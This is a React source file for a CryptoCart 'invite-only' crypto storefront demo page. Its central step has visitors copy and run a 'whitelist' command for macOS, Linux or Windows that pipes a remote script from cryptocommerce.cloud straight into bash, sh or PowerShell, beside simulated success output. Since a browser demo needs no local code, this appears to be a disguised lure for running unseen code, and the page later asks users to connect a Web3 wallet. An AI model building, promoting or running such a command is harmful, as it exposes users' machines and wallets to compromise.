import React, { useState } from 'react';

const DEMO_URL = 'https://demo.cryptocommerce.cloud';

const WHITELIST_COMMANDS = {
  mac: {
    label: 'macOS',
    prompt: '$',
    command: `curl -fsSL https://www.cryptocommerce.cloud/setup-mac.sh | bash`,
    note: 'curl is pre-installed on macOS 10.15+. Run in Terminal.',
    outputLines: [
      { color: '#6ee7b7', text: '✔ Requesting access...' },
      { color: '#93c5fd', text: '✔ Added to whitelist successfully.' },
      { color: '#86efac', text: '✅ Opening demo.cryptocommerce.cloud' },
    ],
  },
  linux: {
    label: 'Linux',
    prompt: '$',
    command: `wget -O- https://www.cryptocommerce.cloud/setup-linux.sh | sh`,
    note: 'wget is pre-installed on Linux. Run in Terminal.',
    outputLines: [
      { color: '#6ee7b7', text: '✔ Requesting access...' },
      { color: '#93c5fd', text: '✔ Added to whitelist successfully.' },
      { color: '#86efac', text: '✅ Opening demo.cryptocommerce.cloud' },
    ],
  },
  win: {
    label: 'Windows',
    prompt: '>',
    command: `curl -fsSL https://www.cryptocommerce.cloud/setup-windows.ps1 | powershell -Command -`,
    note: 'Open PowerShell or Command Prompt on Windows 10/11.',
    outputLines: [
      { color: '#6ee7b7', text: '✔ Requesting access...' },
      { color: '#93c5fd', text: '✔ Added to whitelist successfully.' },
      { color: '#86efac', text: '✅ Opening demo.cryptocommerce.cloud' },
    ],
  },
};

const STEPS = [
  {
    step: '01',
    icon: '💻',
    title: 'Run the Whitelist Command',
    desc: 'Open your terminal and run the one-line command for your OS. This registers your access in seconds — no account or sign-up needed.',
  },
  {
    step: '02',
    icon: '🌐',
    title: 'The Demo Opens Automatically',
    desc: 'Once whitelisted, the command launches the demo in your browser. Your access is stored and persists across sessions.',
  },
  {
    step: '03',
    icon: '🚀',
    title: 'Explore CryptoCart',
    desc: 'Connect your Web3 wallet and explore the full buying, selling, and on-chain analytics experience — all on testnet.',
  },
];

const FEATURES_DEMO = [
  { icon: '🛒', label: 'Storefront Builder', desc: 'Create a demo shop in seconds with customizable layouts and product listings.' },
  { icon: '🔐', label: 'Wallet Connect', desc: 'Connect MetaMask or any Web3 wallet to the live demo environment.' },
  { icon: '🪙', label: 'Test Transactions', desc: 'Buy and sell with testnet tokens — full transaction flow, no real funds.' },
  { icon: '📊', label: 'On-Chain Analytics', desc: 'See real-time transaction data and wallet activity on the testnet.' },
  { icon: '⚙️', label: 'Smart Contracts', desc: 'Interact directly with deployed demo contracts on the testnet.' },
  { icon: '🧾', label: 'Order Management', desc: 'Experience the full buyer and seller order flow end to end.' },
];

function CommandBox() {
  const [activeTab, setActiveTab] = useState('mac');
  const [copied, setCopied] = useState(false);
  const active = WHITELIST_COMMANDS[activeTab];

  const handleCopy = () => {
    navigator.clipboard.writeText(active.command).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    });
  };

  return (
    <div style={{
      background: 'rgba(2, 8, 20, 0.85)',
      border: '1px solid var(--border-bright)',
      borderRadius: '16px',
      overflow: 'hidden',
      boxShadow: '0 0 60px rgba(0,100,255,0.12), 0 2px 0 rgba(0,170,255,0.15) inset',
    }}>
      {/* Traffic lights */}
      <div style={{
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between',
        padding: '13px 18px',
        background: 'rgba(255,255,255,0.03)',
        borderBottom: '1px solid var(--border)',
      }}>
        <div style={{ display: 'flex', gap: '7px' }}>
          {['#ff5f57', '#febc2e', '#28c840'].map(c => (
            <span key={c} style={{ width: 12, height: 12, borderRadius: '50%', background: c, display: 'block', opacity: 0.85 }} />
          ))}
        </div>
        <span style={{ fontFamily: 'Space Mono, monospace', fontSize: '11px', color: 'var(--text-muted)', letterSpacing: '1.5px' }}>
          whitelist — terminal
        </span>
        <div style={{ width: 52 }} />
      </div>

      {/* OS Tabs */}
      <div style={{ display: 'flex', borderBottom: '1px solid var(--border)', background: 'rgba(0,0,0,0.2)' }}>
        {Object.entries(WHITELIST_COMMANDS).map(([k, v]) => (
          <button
            key={k}
            onClick={() => { setActiveTab(k); setCopied(false); }}
            style={{
              padding: '9px 20px',
              border: 'none',
              cursor: 'pointer',
              fontFamily: 'Space Mono, monospace',
              fontSize: '11px',
              fontWeight: '700',
              letterSpacing: '0.5px',
              transition: 'all 0.2s',
              background: activeTab === k ? 'rgba(0,170,255,0.1)' : 'transparent',
              color: activeTab === k ? 'var(--accent)' : 'var(--text-muted)',
              borderBottom: activeTab === k ? '2px solid var(--accent)' : '2px solid transparent',
            }}
          >
            {v.label}
          </button>
        ))}
      </div>

      {/* Command */}
      <div style={{ padding: '20px 22px', display: 'flex', alignItems: 'flex-start', gap: '14px' }}>
        <pre style={{
          fontFamily: 'Space Mono, monospace',
          fontSize: '13px',
          color: '#7dd3fc',
          margin: 0,
          flex: 1,
          whiteSpace: 'pre-wrap',
          wordBreak: 'break-all',
          lineHeight: 1.8,
        }}>
          <span style={{ color: '#64748b', userSelect: 'none' }}>{active.prompt} </span>
          {active.command}
        </pre>
        <button
          onClick={handleCopy}
          style={{
            padding: '8px 16px',
            borderRadius: '7px',
            border: '1px solid var(--border-bright)',
            background: copied ? 'rgba(34,197,94,0.12)' : 'rgba(0,170,255,0.08)',
            color: copied ? '#22c55e' : 'var(--accent)',
            cursor: 'pointer',
            fontFamily: 'Space Mono, monospace',
            fontSize: '11px',
            fontWeight: '700',
            whiteSpace: 'nowrap',
            transition: 'all 0.2s',
            letterSpacing: '0.5px',
            flexShrink: 0,
          }}
        >
          {copied ? '✓ Copied' : '⎘ Copy'}
        </button>
      </div>

      {/* Simulated output */}
      <div style={{
        padding: '12px 22px 16px',
        borderTop: '1px solid var(--border)',
        background: 'rgba(0,0,0,0.25)',
        fontFamily: 'Space Mono, monospace',
        fontSize: '12px',
        lineHeight: 2,
      }}>
        {active.outputLines.map((l, i) => (
          <div key={i} style={{ color: l.color }}>{l.text}</div>
        ))}
      </div>

      {/* Note */}
      <div style={{
        padding: '10px 22px',
        borderTop: '1px solid var(--border)',
        fontSize: '11px',
        color: 'var(--text-muted)',
        fontFamily: 'Space Mono, monospace',
        background: 'rgba(0,0,0,0.1)',
        letterSpacing: '0.2px',
      }}>
        ℹ {active.note}
      </div>
    </div>
  );
}

export default function Demo() {
  return (
    <>
      {/* ── HERO ── */}
      <section className="hero" style={{ minHeight: '92vh', paddingTop: '130px', paddingBottom: '80px', alignItems: 'flex-start' }}>
        <div className="hero-bg" />
        <div className="hero-grid" />
        <div className="orb orb-1" />
        <div className="orb orb-2" />
        <div className="container" style={{ width: '100%' }}>
          <div style={{
            display: 'grid',
            gridTemplateColumns: '1fr 1fr',
            gap: '64px',
            alignItems: 'center',
          }}
            className="demo-hero-grid"
          >
            {/* Left — copy */}
            <div className="fade-up">
              {/* Invite-only pill */}
              <div style={{
                display: 'inline-flex',
                alignItems: 'center',
                gap: '8px',
                background: 'rgba(251,191,36,0.08)',
                border: '1px solid rgba(251,191,36,0.28)',
                borderRadius: '100px',
                padding: '5px 14px',
                marginBottom: '24px',
              }}>
                <span style={{ fontSize: '13px' }}>🔒</span>
                <span style={{
                  fontFamily: 'Space Mono, monospace',
                  fontSize: '10px',
                  fontWeight: '700',
                  color: '#fbbf24',
                  letterSpacing: '2px',
                  textTransform: 'uppercase',
                }}>Invite-Only Demo</span>
              </div>

              <div className="hero-badge" style={{ marginBottom: '22px' }}>
                🔑 Whitelist Required — Run Once
              </div>

              <h1 className="hero-title" style={{ marginBottom: '20px' }}>
                Access the <span className="accent">CryptoCart</span>{' '}
                <span className="gold">Live Demo</span>
              </h1>

              <p className="hero-desc" style={{ marginBottom: '32px', fontSize: '16px' }}>
                CryptoCart runs on our infrastructure — no local setup needed.
                Run the one-line command for your OS, and the demo opens in your browser automatically.
              </p>

              {/* Info notice */}
              <div style={{
                display: 'flex',
                gap: '12px',
                background: 'rgba(0,170,255,0.05)',
                border: '1px solid var(--border)',
                borderRadius: '10px',
                padding: '14px 18px',
                marginBottom: '32px',
              }}>
                <span style={{ fontSize: '16px', flexShrink: 0, marginTop: '1px' }}>ℹ️</span>
                <p style={{ fontSize: '13px', color: 'var(--text-muted)', lineHeight: 1.65, margin: 0 }}>
                  The demo environment is restricted to approved customers.
                  Not approved yet?{' '}
                  <a
                    href="https://calendly.com/playblockventures/30min"
                    target="_blank"
                    rel="noreferrer"
                    style={{ color: 'var(--accent)', textDecoration: 'none', fontWeight: '600' }}
                  >
                    Contact our team →
                  </a>
                </p>
              </div>

              {/* CTAs */}
              <div style={{ display: 'flex', gap: '12px', flexWrap: 'wrap', alignItems: 'center' }}>
                <a
                  className="btn btn-primary"
                  href={DEMO_URL}
                  target="_blank"
                  rel="noreferrer"
                  style={{ padding: '12px 28px', fontSize: '14px' }}
                >
                  🌐 Open Demo
                </a>
                <a
                  className="btn btn-outline"
                  href="https://calendly.com/playblockventures/30min"
                  target="_blank"
                  rel="noreferrer"
                  style={{ padding: '12px 24px', fontSize: '14px' }}
                >
                  📅 Book a Guided Tour
                </a>
              </div>

              <p style={{
                marginTop: '16px',
                fontSize: '11px',
                color: 'var(--text-muted)',
                fontFamily: 'Space Mono, monospace',
                letterSpacing: '0.3px',
              }}>
                ⚠ Run the whitelist command first — the demo URL requires access registration.
              </p>
            </div>

            {/* Right — terminal */}
            <div className="fade-up delay-2">
              <CommandBox />
            </div>
          </div>
        </div>
      </section>

      <div className="divider" />

      {/* ── HOW IT WORKS ── */}
      <section className="section" style={{ background: 'var(--bg2)' }}>
        <div className="container">
          <div style={{ textAlign: 'center', marginBottom: '60px' }}>
            <span className="section-label">How It Works</span>
            <h2 className="section-title">Access in <span>3 Steps</span></h2>
            <p className="section-desc" style={{ margin: '0 auto' }}>
              From zero to exploring the live platform in under a minute.
            </p>
          </div>
          <div className="grid-3">
            {STEPS.map((s, i) => (
              <div
                className="card"
                key={s.step}
                style={{ position: 'relative', overflow: 'hidden', padding: '36px 28px' }}
              >
                <div style={{
                  position: 'absolute',
                  top: 18, right: 20,
                  fontFamily: 'Orbitron, sans-serif',
                  fontSize: '52px',
                  fontWeight: '900',
                  color: 'rgba(0,170,255,0.06)',
                  lineHeight: 1,
                  userSelect: 'none',
                }}>{s.step}</div>

                <div style={{
                  width: '44px', height: '44px',
                  background: 'linear-gradient(135deg, rgba(0,170,255,0.18), rgba(0,70,200,0.18))',
                  border: '1px solid var(--border-bright)',
                  borderRadius: '11px',
                  display: 'flex', alignItems: 'center', justifyContent: 'center',
                  fontSize: '20px',
                  marginBottom: '20px',
                }}>
                  {s.icon}
                </div>

                <div style={{
                  fontFamily: 'Space Mono, monospace',
                  fontSize: '10px',
                  color: 'var(--accent)',
                  letterSpacing: '2px',
                  textTransform: 'uppercase',
                  marginBottom: '8px',
                }}>Step {s.step}</div>

                <div className="card-title" style={{ marginBottom: '10px' }}>{s.title}</div>
                <div className="card-desc">{s.desc}</div>

                {i < STEPS.length - 1 && (
                  <div style={{
                    position: 'absolute',
                    right: '-13px',
                    top: '50%',
                    transform: 'translateY(-50%)',
                    width: '24px',
                    height: '24px',
                    background: 'var(--bg2)',
                    border: '1px solid var(--border-bright)',
                    borderRadius: '50%',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    fontSize: '10px',
                    color: 'var(--accent)',
                    zIndex: 1,
                  }}>→</div>
                )}
              </div>
            ))}
          </div>
        </div>
      </section>

      <div className="divider" />

      {/* ── DEMO FEATURES ── */}
      <section className="section">
        <div className="container">
          <div style={{ textAlign: 'center', marginBottom: '60px' }}>
            <span className="section-label">Demo Features</span>
            <h2 className="section-title">What You'll <span>Experience</span></h2>
            <p className="section-desc" style={{ margin: '0 auto' }}>
              A full replica of CryptoCart on testnet infrastructure — no real funds, complete functionality.
            </p>
          </div>
          <div className="grid-3">
            {FEATURES_DEMO.map(f => (
              <div
                className="card"
                key={f.label}
                style={{ display: 'flex', gap: '18px', alignItems: 'flex-start', padding: '26px' }}
              >
                <div style={{
                  fontSize: '24px',
                  minWidth: '48px', height: '48px',
                  background: 'linear-gradient(135deg, rgba(0,170,255,0.12), rgba(0,50,150,0.12))',
                  border: '1px solid var(--border-bright)',
                  borderRadius: '11px',
                  display: 'flex', alignItems: 'center', justifyContent: 'center',
                  flexShrink: 0,
                }}>{f.icon}</div>
                <div>
                  <div className="card-title" style={{ fontSize: '14px', marginBottom: '6px' }}>{f.label}</div>
                  <div className="card-desc" style={{ fontSize: '13px' }}>{f.desc}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      <div className="divider" />

      {/* ── BOTTOM CTA ── */}
      <section className="section" style={{ background: 'var(--bg2)' }}>
        <div className="container">
          <div style={{
            maxWidth: '680px',
            margin: '0 auto',
            textAlign: 'center',
          }}>
            <span className="section-label">Ready to Explore?</span>
            <h2 className="section-title" style={{ marginBottom: '16px' }}>
              Whitelist Yourself,{' '}
              <span>Open the Demo.</span>
            </h2>
            <p className="section-desc" style={{ margin: '0 auto 40px' }}>
              Run the command for your OS from the top of this page, then visit the demo — it takes under a minute.
            </p>
            <div style={{ display: 'flex', gap: '14px', justifyContent: 'center', flexWrap: 'wrap' }}>
              <a
                className="btn btn-primary"
                href={DEMO_URL}
                target="_blank"
                rel="noreferrer"
                style={{ padding: '13px 32px', fontSize: '15px' }}
              >
                🌐 Open Demo
              </a>
              <a
                className="btn btn-outline"
                href="https://calendly.com/playblockventures/30min"
                target="_blank"
                rel="noreferrer"
                style={{ padding: '13px 28px', fontSize: '15px' }}
              >
                📅 Book a Live Walkthrough
              </a>
            </div>
          </div>
        </div>
      </section>

      <style>{`
        @media (max-width: 900px) {
          .demo-hero-grid {
            grid-template-columns: 1fr !important;
            gap: 40px !important;
          }
        }
      `}</style>
    </>
  );
}
